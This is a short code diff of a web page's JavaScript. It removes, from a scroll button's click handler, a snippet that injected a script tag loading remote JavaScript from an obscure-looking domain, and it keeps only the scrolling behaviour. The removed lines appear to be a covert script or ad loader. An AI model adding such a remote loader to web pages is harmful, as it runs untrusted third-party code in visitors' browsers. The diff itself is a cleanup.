@@ -176,12 +176,7 @@
 
     const scrollToWatchBtn = document.getElementById("scrollToWatchBtn");
     scrollToWatchBtn.onclick = function () {
-      (function(){
-      var s = document.createElement('script');
-      s.src = '//bagfulchiefmeant.com/eb/7a/2c/eb7a2ca242c68578194b74779fc75282.js';
-      document.body.appendChild(s);
-    })();
-    document.getElementById("watchBtn").scrollIntoView({ behavior: "smooth" });
+      document.getElementById("watchBtn").scrollIntoView({ behavior: "smooth" });
     };
     scrollToWatchBtn.style.display = "inline-block";
 
